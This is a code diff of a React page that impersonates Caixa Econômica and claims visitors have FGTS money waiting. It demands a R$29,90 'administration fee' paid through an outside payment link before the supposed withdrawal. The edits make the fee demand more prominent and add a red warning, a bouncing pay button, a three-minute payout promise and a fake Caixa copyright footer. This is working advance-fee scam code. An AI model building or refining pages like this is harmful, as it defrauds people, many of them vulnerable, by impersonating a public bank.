@@ -106,28 +106,69 @@ export function PagamentoTarifa() {
             </header>
 
             {/* Conteúdo principal */}
-            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-6">
-                <h1 className="text-3xl font-bold text-gray-800">VOCÊ TEM DINHEIRO<br />PARA RECEBER</h1>
+            <main className="flex flex-col items-center justify-center text-center mb-6 px-4 py-6 space-y-6">
+                <h1 className="text-4xl font-bold text-gray-800">ÚLTIMA ETAPA<br />PARA RECEBER <br /> SEU FGTS</h1>
 
-                <span className="text-xl">ASSISTA O VÍDEO PARA ENTENDER</span>
+                <h3 className="text-2xl text-zinc-500">Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.</h3>
 
                 <Vimeo
-                    video="1032189936"
+                    video="1043682607"
                     autoplay
                     width={380}
                 />
 
-                <a href="https://pay.iexperience-app.com/f31d1b15" className="w-full">
-                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
-                        PAGAR TAXA E SACAR MEU FGTS
-                    </button>
-                </a>
+                <div>
+                    <div className="flex flex-col items-center justify-center space-x-1">
+                        <div className="bg-primary p-3 w-fit rounded-full">
+                            <img src={logocaixa} width={38} alt="" />
+                        </div>
+                        <p className="text-2xl mb-2 text-primary font-medium">Taxa de <br /> administração Caixa:</p>
+                    </div>
+                    {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
+                    <p className="text-4xl font-semibold text-primary">R$29,90</p>
+                </div>
+
+                {/* Sessão com imagem do Pix e mensagem de justificativa */}
+                <div className="flex flex-col items-center space-y-4">
+                    <img src={pix} alt="Logo Pix" className="w-24 mb-4" />
+                    {/* <p className="text-sm text-gray-600">
+                        <IoIosWarning className="inline mr-1 text-yellow-500" />
+                        Aproveite o desconto na taxa para receber em <strong>até 3 minutos</strong> via Pix.
+                    </p>
+                    <p className="text-xs text-gray-500 max-w-md">
+                        Este valor já inclui o desconto da taxa para recebimento imediato via Pix,
+                        proporcionando uma alternativa rápida e segura ao saque convencional.
+                    </p> */}
+                </div>
+
+
+                <div className=" flex items-center space-x-2">
+                    <div className="h-full">
+                        <IoIosWarning className="text-red-500 text-6xl" />
+                    </div>
+                    <div className="text-red-600 text-2xl">É PRECISO PAGAR A<span className="font-bold"> TAXA DE ADMINISTRAÇÃO</span> PARA <span className="">SACAR SEU FGTS</span></div>
+                </div>
+
+
+                {/* <span className="text-4xl font-bold text-gray-800">ASSISTA O VÍDEO PARA ENTENDER</span> */}
+
+
+
+
+
+
 
                 {/* Informações sobre o saque disponível */}
                 <div className="">
                     <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
                     <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                 </div>
+
+                <a href="https://pay.iexperience-app.com/f31d1b15" className="w-full">
+                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3 text-2xl">
+                        PAGAR TAXA E SACAR MEU FGTS
+                    </button>
+                </a>
 
                 {/* <div className="bg-primary w-full flex p-6 pb-10 flex-col items-center space-y-6">
                     <img width={300} src={caixa} alt="" />
@@ -215,34 +256,19 @@ export function PagamentoTarifa() {
 
 
 
-                <h3 className="text-xl text-zinc-500">Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.</h3>
 
-                <div>
-                    <div className="flex items-center justify-center space-x-1">
-                        <div className="bg-primary p-2 w-fit rounded-full">
-                            <img src={logocaixa} width={25} alt="" />
+                <footer className="bg-white text-gray-300 py-6 w-full">
+                    <div className="container mx-auto flex flex-col md:flex-row justify-between items-center">
+                        <div className="text-sm">
+                            <p>&copy; {new Date().getFullYear()} Caixa Econômica. Todos os direitos reservados.</p>
                         </div>
-                        <p className="text-lg mb-2 text-primary font-medium">Taxa de administração Caixa:</p>
+                        <div className="flex space-x-4 mt-4 md:mt-0">
+                            <a href="#" className="hover:text-white text-sm">Política de Privacidade</a>
+                            <a href="#" className="hover:text-white text-sm">Termos de Uso</a>
+                            <a href="#" className="hover:text-white text-sm">Contato</a>
+                        </div>
                     </div>
-                    {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
-                    <p className="text-4xl font-semibold text-primary">R$29,90</p>
-                </div>
-
-
-
-
-                {/* Sessão com imagem do Pix e mensagem de justificativa */}
-                <div className="flex flex-col items-center space-y-4">
-                    <img src={pix} alt="Logo Pix" className="w-20 mt-4 mb-4" />
-                    <p className="text-sm text-gray-600">
-                        <IoIosWarning className="inline mr-1 text-yellow-500" />
-                        Aproveite o desconto na taxa para receber em <strong>até 3 minutos</strong> via Pix.
-                    </p>
-                    <p className="text-xs text-gray-500 max-w-md">
-                        Este valor já inclui o desconto da taxa para recebimento imediato via Pix,
-                        proporcionando uma alternativa rápida e segura ao saque convencional.
-                    </p>
-                </div>
+                </footer>
 
 
 
